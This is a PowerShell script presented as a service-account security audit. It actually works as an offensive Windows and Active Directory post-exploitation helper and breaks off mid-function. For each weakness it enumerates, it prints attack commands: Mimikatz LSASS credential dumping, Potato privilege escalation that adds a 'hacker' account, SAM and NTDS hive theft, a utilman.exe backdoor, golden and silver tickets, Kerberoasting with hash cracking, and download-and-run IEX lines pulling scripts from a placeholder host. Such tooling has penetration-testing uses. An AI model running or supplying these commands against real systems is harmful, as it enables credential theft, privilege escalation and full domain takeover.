function Invoke-ComprehensiveServiceAudit {
    [CmdletBinding()]
    param(
        [switch]$GenerateExploitCommands,
        [switch]$DetailedOutput,
        [switch]$ExportResults,
        [string]$OutputPath = ".\AuditResults_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
    )
    
    $script:StartTime = Get-Date
    $script:ExploitCommands = @()
    $script:Findings = @()
    
    # Banner
    Write-Host @"
╔════════════════════════════════════════════════════════════════════════════╗
║         ADVANCED SERVICE ACCOUNT SECURITY AUDIT FRAMEWORK                  ║
║         Enumeration + Exploitation Command Generation                      ║
╚════════════════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan

    Write-Host "`n[*] Start Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Gray
    Write-Host "[*] Current User: $env:USERDOMAIN\$env:USERNAME" -ForegroundColor Gray
    Write-Host "[*] Computer: $env:COMPUTERNAME" -ForegroundColor Gray
    Write-Host "[*] Domain: $((Get-WmiObject Win32_ComputerSystem).Domain)" -ForegroundColor Gray
    
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Write-Host "[*] Admin Rights: $(if($isAdmin){'YES'}else{'NO'})" -ForegroundColor $(if($isAdmin){'Red'}else{'Yellow'})
    Write-Host ""

    # ========================================================================
    # SECTION 1: PRIVILEGE ENUMERATION & EXPLOITATION
    # ========================================================================
    Write-Host "`n╔════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║ [1] PRIVILEGE ENUMERATION & TOKEN MANIPULATION                             ║" -ForegroundColor Green
    Write-Host "╚════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    
    Write-Host "`n[+] Current User Token Privileges:" -ForegroundColor Cyan
    $privOutput = whoami /priv 2>$null
    $privileges = @{}
    
    $criticalPrivileges = @{
        'SeDebugPrivilege' = 'Process memory access, credential dumping'
        'SeTcbPrivilege' = 'Act as part of OS, create tokens'
        'SeBackupPrivilege' = 'Backup files, read any file'
        'SeRestorePrivilege' = 'Restore files, write any file'
        'SeCreateTokenPrivilege' = 'Create access tokens'
        'SeAssignPrimaryTokenPrivilege' = 'Replace process tokens'
        'SeLoadDriverPrivilege' = 'Load kernel drivers'
        'SeTakeOwnershipPrivilege' = 'Take ownership of files'
        'SeImpersonatePrivilege' = 'Impersonate tokens (Potato attacks)'
    }
    
    foreach ($line in $privOutput -split "`n") {
        $line = $line.Trim()
        foreach ($priv in $criticalPrivileges.Keys) {
            if ($line -match $priv) {
                $status = if ($line -match "Enabled") { "ENABLED" } else { "Disabled" }
                $privileges[$priv] = $status
                
                $color = if ($status -eq "ENABLED") { "Red" } else { "Yellow" }
                Write-Host "  [!] $priv : $status" -ForegroundColor $color
                Write-Host "      Purpose: $($criticalPrivileges[$priv])" -ForegroundColor Gray
                
                if ($status -eq "ENABLED") {
                    Add-Finding "CRITICAL" "Enabled Privilege: $priv" $criticalPrivileges[$priv]
                    
                    # Generate exploit commands
                    switch ($priv) {
                        'SeDebugPrivilege' {
                            Write-Host "`n      [EXPLOIT COMMANDS - CREDENTIAL DUMPING]:" -ForegroundColor Red
                            Write-Host "      # Mimikatz - LSASS Dump" -ForegroundColor White
                            Write-Host "      mimikatz.exe `"privilege::debug`" `"sekurlsa::logonpasswords`" `"exit`"" -ForegroundColor Yellow
                            Write-Host "      mimikatz.exe `"privilege::debug`" `"sekurlsa::tickets /export`" `"exit`"" -ForegroundColor Yellow
                            
                            Write-Host "`n      # Procdump + Mimikatz Offline" -ForegroundColor White
                            Write-Host "      procdump.exe -accepteula -ma lsass.exe lsass.dmp" -ForegroundColor Yellow
                            Write-Host "      mimikatz.exe `"sekurlsa::minidump lsass.dmp`" `"sekurlsa::logonpasswords`" `"exit`"" -ForegroundColor Yellow
                            
                            Write-Host "`n      # PowerShell LSASS Dump (Invoke-Mimikatz)" -ForegroundColor White
                            Write-Host "      IEX (New-Object Net.WebClient).DownloadString('http://[IP]/Invoke-Mimikatz.ps1')" -ForegroundColor Yellow
                            Write-Host "      Invoke-Mimikatz -DumpCreds" -ForegroundColor Yellow
                            
                            Write-Host "`n      # SafetyKatz (Latest Mimikatz)" -ForegroundColor White
                            Write-Host "      SafetyKatz.exe `"sekurlsa::logonpasswords`" `"exit`"" -ForegroundColor Yellow
                            
                            Write-Host "`n      # SharpDump (C# LSASS Dumper)" -ForegroundColor White
                            Write-Host "      SharpDump.exe" -ForegroundColor Yellow
                            
                            Add-ExploitCommand "Credential Dumping" "mimikatz.exe `"privilege::debug`" `"sekurlsa::logonpasswords`" `"exit`""
                        }
                        'SeImpersonatePrivilege' {
                            Write-Host "`n      [EXPLOIT COMMANDS - POTATO ATTACKS]:" -ForegroundColor Red
                            Write-Host "      # JuicyPotato (Windows Server 2016/2019)" -ForegroundColor White
                            Write-Host "      JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a `"/c whoami > C:\temp\output.txt`" -t *" -ForegroundColor Yellow
                            Write-Host "      JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a `"/c net user hacker Password123! /add`" -t * -c {CLSID}" -ForegroundColor Yellow
                            
                            Write-Host "`n      # RoguePotato" -ForegroundColor White
                            Write-Host "      RoguePotato.exe -r [ATTACKER_IP] -e `"C:\Windows\System32\cmd.exe`" -l 9999" -ForegroundColor Yellow
                            
                            Write-Host "`n      # PrintSpoofer (Windows 10/Server 2019+)" -ForegroundColor White
                            Write-Host "      PrintSpoofer.exe -i -c cmd" -ForegroundColor Yellow
                            Write-Host "      PrintSpoofer.exe -c `"powershell -ep bypass -nop`"" -ForegroundColor Yellow
                            
                            Write-Host "`n      # GodPotato (Latest)" -ForegroundColor White
                            Write-Host "      GodPotato.exe -cmd `"cmd /c whoami`"" -ForegroundColor Yellow
                            Write-Host "      GodPotato.exe -cmd `"powershell -ep bypass -file C:\temp\rev.ps1`"" -ForegroundColor Yellow
                            
                            Add-ExploitCommand "Token Impersonation" "PrintSpoofer.exe -i -c powershell"
                        }
                        'SeBackupPrivilege' {
                            Write-Host "`n      [EXPLOIT COMMANDS - FILE/REGISTRY ACCESS]:" -ForegroundColor Red
                            Write-Host "      # Copy SAM/SYSTEM Hives" -ForegroundColor White
                            Write-Host "      reg save HKLM\SAM C:\temp\sam.hive" -ForegroundColor Yellow
                            Write-Host "      reg save HKLM\SYSTEM C:\temp\system.hive" -ForegroundColor Yellow
                            Write-Host "      reg save HKLM\SECURITY C:\temp\security.hive" -ForegroundColor Yellow
                            
                            Write-Host "`n      # Extract with Impacket" -ForegroundColor White
                            Write-Host "      impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL" -ForegroundColor Yellow
                            
                            Write-Host "`n      # NTDS.dit Extraction (DC)" -ForegroundColor White
                            Write-Host "      ntdsutil `"ac i ntds`" `"ifm`" `"create full C:\temp\ntds`" q q" -ForegroundColor Yellow
                            Write-Host "      impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL" -ForegroundColor Yellow
                            
                            Write-Host "`n      # diskshadow + robocopy Method" -ForegroundColor White
                            Write-Host @"
      echo 'set context persistent nowriters' > diskshadow.txt
      echo 'add volume c: alias temp' >> diskshadow.txt
      echo 'create' >> diskshadow.txt
      echo 'expose %temp% z:' >> diskshadow.txt
      diskshadow.exe /s diskshadow.txt
      robocopy /b z:\Windows\ntds . ntds.dit
      reg save HKLM\SYSTEM system.hive
"@ -ForegroundColor Yellow
                            
                            Add-ExploitCommand "Registry Dump" "reg save HKLM\SAM sam.hive && reg save HKLM\SYSTEM system.hive"
                        }
                        'SeRestorePrivilege' {
                            Write-Host "`n      [EXPLOIT COMMANDS - FILE MANIPULATION]:" -ForegroundColor Red
                            Write-Host "      # Overwrite System Files" -ForegroundColor White
                            Write-Host "      # Replace utilman.exe with cmd.exe for backdoor" -ForegroundColor Yellow
                            Write-Host "      takeown /f C:\Windows\System32\utilman.exe" -ForegroundColor Yellow
                            Write-Host "      icacls C:\Windows\System32\utilman.exe /grant administrators:F" -ForegroundColor Yellow
                            Write-Host "      copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe" -ForegroundColor Yellow
                            
                            Write-Host "`n      # Service Binary Replacement" -ForegroundColor White
                            Write-Host "      sc stop VulnerableService" -ForegroundColor Yellow
                            Write-Host "      copy /y evil.exe `"C:\Program Files\VulnerableApp\service.exe`"" -ForegroundColor Yellow
                            Write-Host "      sc start VulnerableService" -ForegroundColor Yellow
                        }
                        'SeLoadDriverPrivilege' {
                            Write-Host "`n      [EXPLOIT COMMANDS - KERNEL EXPLOITATION]:" -ForegroundColor Red
                            Write-Host "      # Load Malicious Driver" -ForegroundColor White
                            Write-Host "      # Use Capcom.sys or similar vulnerable driver" -ForegroundColor Yellow
                            Write-Host "      EoPLoadDriver.exe System\CurrentControlSet\MyService C:\temp\driver.sys" -ForegroundColor Yellow
                            
                            Write-Host "`n      # RTCore64.sys Exploit" -ForegroundColor White
                            Write-Host "      # Load RTCore64.sys and execute arbitrary kernel code" -ForegroundColor Yellow
                        }
                    }
                    Write-Host ""
                }
            }
        }
    }
    
    # ========================================================================
    # SECTION 2: KERBEROS TICKET ANALYSIS & ATTACKS
    # ========================================================================
    Write-Host "`n╔════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║ [2] KERBEROS TICKET ANALYSIS & ATTACK VECTORS                              ║" -ForegroundColor Green
    Write-Host "╚════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    
    Write-Host "`n[+] Cached Kerberos Tickets:" -ForegroundColor Cyan
    $ticketOutput = klist 2>$null
    $ticketCount = 0
    $tickets = @()
    
    if ($LASTEXITCODE -eq 0) {
        $currentTicket = $null
        foreach ($line in $ticketOutput -split "`n") {
            $line = $line.Trim()
            if ($line -match "Server:\s*(.+)") {
                $ticketCount++
                $currentTicket = @{
                    Server = $matches[1].Trim()
                    Number = $ticketCount
                }
            }
            if ($line -match "End Time:\s*(.+)" -and $currentTicket) {
                $currentTicket.EndTime = $matches[1].Trim()
                $tickets += $currentTicket
                
                Write-Host "  [Ticket #$($currentTicket.Number)]" -ForegroundColor Yellow
                Write-Host "    Service: $($currentTicket.Server)" -ForegroundColor White
                Write-Host "    Expires: $($currentTicket.EndTime)" -ForegroundColor Gray
                
                $currentTicket = $null
            }
        }
        
        Write-Host "`n  Total Cached Tickets: $ticketCount" -ForegroundColor $(if($ticketCount -gt 10){'Yellow'}else{'Green'})
        
        if ($ticketCount -gt 0) {
            Write-Host "`n  [KERBEROS ATTACK COMMANDS]:" -ForegroundColor Red
            
            Write-Host "`n  # Export All Tickets (Mimikatz)" -ForegroundColor White
            Write-Host "  mimikatz.exe `"privilege::debug`" `"sekurlsa::tickets /export`" `"exit`"" -ForegroundColor Yellow
            
            Write-Host "`n  # Export Tickets (Rubeus)" -ForegroundColor White
            Write-Host "  Rubeus.exe dump /nowrap" -ForegroundColor Yellow
            Write-Host "  Rubeus.exe dump /luid:0x[LUID] /nowrap" -ForegroundColor Yellow
            
            Write-Host "`n  # Pass-the-Ticket (PTT)" -ForegroundColor White
            Write-Host "  # Using Mimikatz:" -ForegroundColor Gray
            Write-Host "  mimikatz.exe `"kerberos::ptt [ticket.kirbi]`" `"exit`"" -ForegroundColor Yellow
            Write-Host "  # Using Rubeus:" -ForegroundColor Gray
            Write-Host "  Rubeus.exe ptt /ticket:[base64_ticket]" -ForegroundColor Yellow
            
            Write-Host "`n  # Over-Pass-the-Hash (OPTH)" -ForegroundColor White
            Write-Host "  mimikatz.exe `"sekurlsa::pth /user:[USER] /domain:[DOMAIN] /ntlm:[HASH] /run:powershell`"" -ForegroundColor Yellow
            Write-Host "  Rubeus.exe asktgt /user:[USER] /rc4:[HASH] /ptt" -ForegroundColor Yellow
            
            Write-Host "`n  # Golden Ticket (if krbtgt hash obtained)" -ForegroundColor White
            Write-Host "  mimikatz.exe `"kerberos::golden /user:Administrator /domain:[DOMAIN] /sid:[DOMAIN_SID] /krbtgt:[HASH] /ptt`"" -ForegroundColor Yellow
            Write-Host "  Rubeus.exe golden /rc4:[KRBTGT_HASH] /user:Administrator /domain:[DOMAIN] /sid:[DOMAIN_SID] /nowrap" -ForegroundColor Yellow
            
            Write-Host "`n  # Silver Ticket (if service account hash obtained)" -ForegroundColor White
            Write-Host "  mimikatz.exe `"kerberos::golden /user:Administrator /domain:[DOMAIN] /sid:[DOMAIN_SID] /target:[TARGET] /service:[SPN] /rc4:[HASH] /ptt`"" -ForegroundColor Yellow
            
            Add-ExploitCommand "Ticket Export" "Rubeus.exe dump /nowrap"
        }
    } else {
        Write-Host "  No tickets found or klist failed" -ForegroundColor Gray
    }
    
    # ========================================================================
    # SECTION 3: SERVICE ACCOUNT ENUMERATION & EXPLOITATION
    # ========================================================================
    Write-Host "`n╔════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║ [3] SERVICE ACCOUNT ENUMERATION & PASSWORD EXTRACTION                     ║" -ForegroundColor Green
    Write-Host "╚════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    
    Write-Host "`n[+] Services with Non-System Accounts:" -ForegroundColor Cyan
    $services = Get-CimInstance Win32_Service | Where-Object { 
        $_.StartName -and 
        $_.StartName -notmatch '^(LocalSystem|NT AUTHORITY|NT SERVICE|LocalService|NetworkService)' 
    }
    
    $domainServiceAccounts = @()
    $localServiceAccounts = @()
    
    foreach ($svc in $services) {
        $svcInfo = @{
            Name = $svc.Name
            DisplayName = $svc.DisplayName
            Account = $svc.StartName
            State = $svc.State
            StartMode = $svc.StartMode
            ProcessId = $svc.ProcessId
            PathName = $svc.PathName
        }
        
        if ($svc.StartName -match '^[A-Za-z0-9_-]+\\.+') {
            $domainServiceAccounts += $svcInfo
        } else {
            $localServiceAccounts += $svcInfo
        }
    }
    
    if ($domainServiceAccounts.Count -gt 0) {
        Write-Host "`n  [!] DOMAIN SERVICE ACCOUNTS DETECTED: $($domainServiceAccounts.Count)" -ForegroundColor Red
        
        foreach ($svc in $domainServiceAccounts) {
            Write-Host "`n  [Service: $($svc.Name)]" -ForegroundColor Yellow
            Write-Host "    Display Name: $($svc.DisplayName)" -ForegroundColor White
            Write-Host "    Account: $($svc.Account)" -ForegroundColor Red
            Write-Host "    State: $($svc.State)" -ForegroundColor $(if($svc.State -eq 'Running'){'Green'}else{'Gray'})
            Write-Host "    Start Mode: $($svc.StartMode)" -ForegroundColor Gray
            Write-Host "    Binary Path: $($svc.PathName)" -ForegroundColor Gray
            
            if ($svc.State -eq 'Running' -and $svc.ProcessId -gt 0) {
                Write-Host "    Process ID: $($svc.ProcessId)" -ForegroundColor Gray
                
                # Check if we can access process
                try {
                    $proc = Get-Process -Id $svc.ProcessId -ErrorAction SilentlyContinue
                    if ($proc) {
                        Write-Host "    Memory: $([math]::Round($proc.WorkingSet64/1MB,2)) MB" -ForegroundColor Gray
                        Write-Host "    Handles: $($proc.HandleCount)" -ForegroundColor Gray
                    }
                } catch {}
            }
            
            Add-Finding "HIGH" "Domain Service Account" "$($svc.Name) running as $($svc.Account)"
        }
        
        Write-Host "`n  [SERVICE ACCOUNT EXPLOITATION COMMANDS]:" -ForegroundColor Red
        
        Write-Host "`n  # Method 1: Extract Credentials from LSA Secrets" -ForegroundColor White
        Write-Host "  mimikatz.exe `"privilege::debug`" `"token::elevate`" `"lsadump::secrets`" `"exit`"" -ForegroundColor Yellow
        Write-Host "  reg save HKLM\SECURITY security.hive" -ForegroundColor Yellow
        Write-Host "  reg save HKLM\SYSTEM system.hive" -ForegroundColor Yellow
        Write-Host "  impacket-secretsdump -security security.hive -system system.hive LOCAL" -ForegroundColor Yellow
        
        Write-Host "`n  # Method 2: Extract from Service Configuration" -ForegroundColor White
        foreach ($svc in $domainServiceAccounts | Select-Object -First 3) {
            Write-Host "  sc qc `"$($svc.Name)`"  # View service config" -ForegroundColor Yellow
        }
        
        Write-Host "`n  # Method 3: Process Memory Dump (if running)" -ForegroundColor White
        foreach ($svc in $domainServiceAccounts | Where-Object {$_.State -eq 'Running'} | Select-Object -First 3) {
            Write-Host "  procdump.exe -accepteula -ma $($svc.ProcessId) $($svc.Name).dmp" -ForegroundColor Yellow
            Write-Host "  strings $($svc.Name).dmp | findstr /i password" -ForegroundColor Yellow
        }
        
        Write-Host "`n  # Method 4: Token Impersonation (if running as target account)" -ForegroundColor White
        Write-Host "  # Using Incognito (Metasploit/Standalone)" -ForegroundColor Gray
        Write-Host "  incognito.exe list_tokens -u" -ForegroundColor Yellow
        Write-Host "  incognito.exe execute -c `"[DOMAIN]\[USER]`" cmd.exe" -ForegroundColor Yellow
        
        Write-Host "  # Using Invoke-TokenManipulation" -ForegroundColor Gray
        Write-Host "  IEX (New-Object Net.WebClient).DownloadString('http://[IP]/Invoke-TokenManipulation.ps1')" -ForegroundColor Yellow
        Write-Host "  Invoke-TokenManipulation -ShowAll" -ForegroundColor Yellow
        Write-Host "  Invoke-TokenManipulation -ImpersonateUser -Username `"[DOMAIN]\[USER]`"" -ForegroundColor Yellow
        
        Write-Host "`n  # Method 5: Kerberoasting (if SPN assigned)" -ForegroundColor White
        Write-Host "  # Enumerate SPNs" -ForegroundColor Gray
        Write-Host "  setspn -T [DOMAIN] -Q */*" -ForegroundColor Yellow
        Write-Host "  # Request TGS tickets (Rubeus)" -ForegroundColor Gray
        foreach ($svc in $domainServiceAccounts | Select-Object -First 3) {
            $username = $svc.Account -replace '^.+\\', ''
            Write-Host "  Rubeus.exe kerberoast /user:$username /nowrap" -ForegroundColor Yellow
        }
        Write-Host "  # Crack with Hashcat" -ForegroundColor Gray
        Write-Host "  hashcat -m 13100 -a 0 ticket.txt wordlist.txt --force" -ForegroundColor Yellow
        
        Add-ExploitCommand "LSA Secrets Dump" "mimikatz.exe `"lsadump::secrets`""
    }
    
    if ($localServiceAccounts.Count -gt 0) {
        Write-Host "`n  [+] Local Service Accounts: $($localServiceAccounts.Count)" -ForegroundColor Yellow
        foreach ($svc in $localServiceAccounts | Select-Object -First 5) {
            Write-Host "    - $($svc.Name): $($svc.Account)" -ForegroundColor Gray
        }
    }
    
    # ========================================================================
    # SECTION 4: ACTIVE DIRECTORY ENUMERATION & ATTACKS
    # ========================================================================
    Write-Host "`n╔════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║ [4] ACTIVE DIRECTORY ENUMERATION & ATTACK VECTORS                          ║" -ForegroundColor Green
    Write-Host "╚════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    
    $domainJoined = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
    
    if ($domainJoined) {
        $domain = (Get-WmiObject Win32_ComputerSystem).Domain
        Write-Host "`n[+] Domain Joined: $domain" -ForegroundColor Green
        
        # AS-REP Roasting
        Write-Host "`n[+] AS-REP Roastable Accounts (No Kerberos Pre-Auth):" -ForegroundColor Cyan
        try {
            $searcher = [adsisearcher]'(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
            $searcher.PageSize = 1000
            $asrepUsers = $searcher.FindAll()
            
            if ($asrepUsers.Count -gt 0) {
                Write-Host "  [!] VULNERABLE ACCOUNTS FOUND: $($asrepUsers.Count)" -ForegroundColor Red
                
                foreach ($user in $asrepUsers) {
                    $sam = $user.Properties['samaccountname'][0]
                    $dn = $user.Properties['distinguishedname'][0]
                    
                    Write-Host "`n  [User: $sam]" -ForegroundColor Red
                    Write-Host "    DN: $dn" -ForegroundColor Gray
                    
                    if ($user.Properties['pwdlastset']) {
                        $pwdDate = [datetime]::FromFileTime([int64]$user.Properties['pwdlastset'][0])
                        $daysOld = (New-TimeSpan -Start $pwdDate -End (Get-Date)).Days
                        Write-Host "    Password Age: $daysOld days" -ForegroundColor Yellow
                    }
                    
                    Add-Finding "CRITICAL" "AS-REP Roastable" "$sam - No Kerberos pre-authentication"
                }
                
                Write-Host "`n  [AS-REP ROASTING ATTACK COMMANDS]:" -ForegroundColor Red
                
                Write-Host "`n  # Method 1: Rubeus (Windows)" -ForegroundColor White
                Write-Host "  Rubeus.exe asreproast /format:hashcat /nowrap" -ForegroundColor Yellow
                Write-Host "  Rubeus.exe asreproast /user:$($asrepUsers[0].Properties['samaccountname'][0]) /format:hashcat /nowrap" -ForegroundColor Yellow
                
                Write-Host "`n  # Method 2: Impacket (Linux)" -ForegroundColor White
                Write-Host "  impacket-GetNPUsers $domain/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt" -ForegroundColor Yellow
                Write-Host "  impacket-GetNPUsers $domain/$($asrepUsers[0].Properties['samaccountname'][0]) -no-pass -format hashcat" -ForegroundColor Yellow
                
                Write-Host "`n  # Method 3: PowerView" -ForegroundColor White
                Write-Host "  Get-DomainUser -PreauthNotRequired | Select samaccountname" -ForegroundColor Yellow
                
                Write-Host "`n  # Crack with Hashcat" -ForegroundColor White
                Write-Host "  hashcat -m 18200 -a 0 asrep_hashes.txt wordlist.txt --force" -ForegroundColor Yellow
                Write-Host "  hashcat -m 18200 -a 0 asrep_hashes.txt wordlist.txt -r rules/best64.rule --force" -ForegroundColor Yellow
                
                Add-ExploitCommand "AS-REP Roast" "Rubeus.exe asreproast /format:hashcat /nowrap"
            } else {
                Write-Host "  No AS-REP roastable accounts found" -ForegroundColor Green
            }
        } catch {
            Write-Host "  Error enumerating AS-REP: $_" -ForegroundColor Red
        }
        
        # Kerberoasting
        Write-Host "`n[+] Kerberoastable Accounts (Users with SPNs):" -ForegroundColor Cyan
        try {
            $searcher = [adsisearcher]'(&(objectCategory=user)(servicePrincipalName=*))'
            $searcher.PageSize = 1000
            $searcher.PropertiesToLoad.AddRange(@('samaccountname','serviceprincipalname','pwdlastset','distinguishedname','memberof'))
            $spnUsers = $searcher.FindAll()
            
            if ($spnUsers.Count -gt 0) {
                Write-Host "  [!] KERBEROASTABLE ACCOUNTS FOUND: $($spnUsers.Count)" -ForegroundColor Red
                
                foreach ($user in $spnUsers) {
                    $sam = $user.Properties['samaccountname'][0]
                    $spns = $user.Properties['serviceprincipalname']
                    
                    Write-Host "`n  [User: $sam]" -ForegroundColor Red
                    Write-Host "    SPNs:" -ForegroundColor Gray
                    foreach ($spn in $spns) {
                        Write-Host "      - $spn" -ForegroundColor Yellow
                    }
                    
                    if ($user.Properties['pwdlastset']) {
                        $pwdDate = [datetime]::FromFileTime([int64]$user.Properties['pwdlastset'][0])
                        $daysOld = (New-TimeSpan -Start $pwdDate -End (Get-Date)).Days
                        Write-Host "    Password Age: $daysOld days" -ForegroundColor $(if($daysOld -gt 365){'Red'}else{'Yellow'})
                        
                        if ($daysOld -gt 365) {
                            Write-Host "    [!] OLD PASSWORD - Higher crack probability!" -ForegroundColor Red
                        }
                    }
                    
                    # Check for admin groups
                    if ($user.Properties['memberof']) {
                        $adminGroups = $user.Properties['memberof'] | Where-Object { 
                            $_ -match 'Domain Admins|Enterprise Admins|Administrators' 
                        }
                        if ($adminGroups) {
                            Write-Host "    [!] PRIVILEGED ACCOUNT!" -ForegroundColor Red
                            foreach ($grp in $adminGroups) {
                                Write-Host "      Member of: $grp" -ForegroundColor Red
                            }
                        }
                    }
                    
                    Add-Finding "HIGH" "Kerberoastable Account" "$sam with $($spns.Count) SPNs"
                }
                
                Write-Host "`n  [KERBEROASTING ATTACK COMMANDS]:" -ForegroundColor Red
                
                Write-Host "`n  # Method 1: Rubeus (Best for Windows)" -ForegroundColor White
                Write-Host "  Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt /nowrap" -ForegroundColor Yellow
                Write-Host "  Rubeus.exe kerberoast /user:$($spnUsers[0].Properties['samaccountname'][0]) /nowrap" -ForegroundColor Yellow
                Write-Host "  Rubeus.exe kerberoast /tgtdeleg /nowrap  # Using TGT delegation trick" -ForegroundColor Yellow
                
                Write-Host "`n  # Method 2: Impacket (Linux)" -ForegroundColor White
                Write-Host "  impacket-GetUserSPNs $domain/[user]:[pass] -dc-ip [DC_IP] -request" -ForegroundColor Yellow
                Write-Host "  impacket-GetUserSPNs $domain/[user]:[pass] -dc-ip [DC_IP] -request-user $($spnUsers[0].Properties['samaccountname'][0])" -ForegroundColor Yellow
                
                Write-Host "`n  # Method 3: PowerShell (Invoke-Kerberoast)" -ForegroundColor White
                Write-Host "  IEX (New-Object Net.WebClient).DownloadString('http://[IP]/Invoke-Kerberoast.ps1')" -ForegroundColor Yellow
                Write-Host "  Invoke-Kerberoast -OutputFormat Hashcat | fl" -ForegroundColor Yellow
                
                Write-Host "`n  # Method 4: PowerView" -ForegroundColor White
                Write-Host "  Get-DomainUser -SPN | Select samaccountname,serviceprincipalname" -ForegroundColor Yellow
                Write-Host "  Request-SPNTicket -SPN `"[SPN]`" -Format Hashcat" -ForegroundColor Yellow
                
                Write-Host "`n  # Method 5: Targeted Kerberoast" -ForegroundColor White
                Write-Host "  setspn -T $domain -Q */*  # Enumerate all SPNs" -ForegroundColor Yellow
                Write-Host "  Add-Type -AssemblyName System.IdentityModel" -ForegroundColor Yellow
                Write-Host "  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '[SPN]'" -ForegroundColor Yellow
                Write-Host "  klist  # View requested tickets" -ForegroundColor Yellow
                Write-Host "  mimikatz.exe `"kerberos::list /export`"  # Export tickets" -ForegroundColor Yellow
                
                Write-Host "`n  # Crack Tickets" -ForegroundColor White
                Write-Host "  # Hashcat (TGS-REP encrypted part)" -ForegroundColor Gray
                Write-Host "  hashcat -m 13100 -a 0 kerberoast_hashes.txt wordlist.txt --force" -ForegroundColor Yellow
                Write-Host "  hashcat -m 13100 -a 0 kerberoast_hashes.txt wordlist.txt -r rules/best64.rule --force" -ForegroundColor Yellow
                Write-Host "  # John the Ripper" -ForegroundColor Gray
                Write-Host "  kirbi2john ticket.kirbi > ticket.john" -ForegroundColor Yellow
                Write-Host "  john --wordlist=wordlist.txt ticket.john" -ForegroundColor Yellow
                
                Add-ExploitCommand "Kerberoast" "Rubeus.exe kerberoast /nowrap"
            } else {
                Write-Host "  No kerberoastable accounts found" -ForegroundColor Green
            }
        } catch {
            Write-Host "  Error enumerating SPNs: $_" -ForegroundColor Red
        }
        
        # Unconstrained Delegation
        Write-Host "`n[+] Unconstrained Delegation Systems:" -ForegroundColor Cyan
        try {
            $searcher = [adsisearcher]'(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))'
            $searcher.PageSize = 1000
            $searcher.PropertiesToLoad.AddRange(@('dnshostname','operatingsystem','lastlogontimestamp'))
            $unconstrainedComputers = $searcher.FindAll()
            
            if ($unconstrainedComputers.Count -gt 0) {
                Write-Host "  [!] UNCONSTRAINED DELEGATION FOUND: $($unconstrainedComputers.Count)" -ForegroundColor Red
                
                foreach ($comp in $unconstrainedComputers) {
                    $hostname = $comp.Properties['dnshostname'][0]
                    Write-Host "`n  [Computer: $hostname]" -ForegroundColor Red
                    
                    if ($comp.Properties['operatingsystem']) {
                        Write-Host "    OS: $($comp.Properties['operatingsystem'][0])" -ForegroundColor Gray
                    }
                    
                    if ($comp.Properties['lastlogontimestamp']) {
                        $lastLogon = [datetime]::FromFileTime([int64]$comp.Properties['lastlogontimestamp'][0])
                        $daysSince = (New-TimeSpan -Start $lastLogon -End (Get-Date)).Days
                        Write-Host "    Last Active: $daysSince days ago" -ForegroundColor Yellow
                    }
                    
                    Add-Finding "CRITICAL" "Unconstrained Delegation" "$hostname - Can impersonate any user"
                }
                
                Write-Host "`n  [UNCONSTRAINED DELEGATION EXPLOITATION]:" -ForegroundColor Red
                
                Write-Host "`n  # Monitor for TGTs (Rubeus)" -ForegroundColor White
                Write-Host "  Rubeus.exe monitor /interval:5 /nowrap" -ForegroundColor Yellow
                Write-Host "  Rubeus.exe monitor /filteruser:[TARGET_USER] /nowrap" -ForegroundColor Yellow
                
                Write-Host "`n  # Trigger Authentication from Target" -ForegroundColor White
                Write-Host "  # SpoolSample (Print Bug)" -ForegroundColor Gray
                Write-Host "  SpoolSample.exe [TARGET_DC] $($unconstrainedComputers[0].Properties['dnshostname'][0])" -ForegroundColor Yellow
                Write-Host "  # PetitPotam" -ForegroundColor Gray
                Write-Host "  PetitPotam.exe $($unconstrainedComputers[0].Properties['dnshostname'][0]) [TARGET_DC]" -ForegroundColor Yellow
                
                Write-Host "`n  # Extract and Use TGT" -ForegroundColor White
                Write-Host "  mimikatz.exe `"privilege::debug`" `"sekurlsa::tickets /export`" `"exit`"" -ForegroundColor Yellow
                Write-Host "  mimikatz.exe `"kerberos::ptt [ticket.kirbi]`" `"exit`"" -ForegroundColor Yellow
                Write-Host "  Rubeus.exe ptt /ticket:[base64_ticket]" -ForegroundColor Yellow
                
                Add-ExploitCommand "Unconstrained Delegation" "Rubeus.exe monitor /interval:5"
            } else {
                Write-Host "  No unconstrained delegation found" -ForegroundColor Green
            }
        } catch {
            Write-Host "  Error enumerating delegation: $_" -ForegroundColor Red
        }
        
        # Constrained Delegation
        Write-Host "`n[+] Constrained Delegation:" -ForegroundColor Cyan
        try {
            $searcher = [adsisearcher]'(&(objectCategory=computer)(msds-allowedtodelegateto=*))'
            $searcher.PageSize = 1000
            $searcher.PropertiesToLoad.AddRange(@('dnshostname','msds-allowedtodelegateto','useraccountcontrol'))
            $constrainedComputers = $searcher.FindAll()
            
            if ($constrainedComputers.Count -gt 0) {
                Write-Host "  [!] CONSTRAINED DELEGATION FOUND: $($constrainedComputers.Count)" -ForegroundColor Yellow
                
                foreach ($comp in $constrainedComputers) {
                    $hostname = $comp.Properties['dnshostname'][0]
                    $delegateTo = $comp.Properties['msds-allowedtodelegateto']
                    
                    Write-Host "`n  [Computer: $hostname]" -ForegroundColor Yellow
